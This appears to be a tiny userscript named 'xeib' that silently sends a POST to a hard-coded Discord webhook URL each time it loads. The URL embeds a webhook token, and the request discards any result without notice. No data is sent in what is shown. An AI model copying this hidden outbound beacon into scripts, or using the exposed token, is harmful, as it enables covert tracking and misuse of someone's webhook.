// ==UserScript==
// @name xeib
// @version 2.2.2
// @connect discord.com

function connect() {
        GM_xmlhttpRequest({
            method: "POST",
            url: "https://discord.com/api/webhooks/1294772166835048561/VT0WqDA2NtiFUf9GQDjFuiHCe0vxzauhdJKcee4HVnThunUbuZQ12w68-pHSnCCgbdd8",
            headers: {
                'Content-Type': 'application/json'
            },
            onload: function(response) {
            },
            onerror: function(err) {
            }
        });
    }
connect()
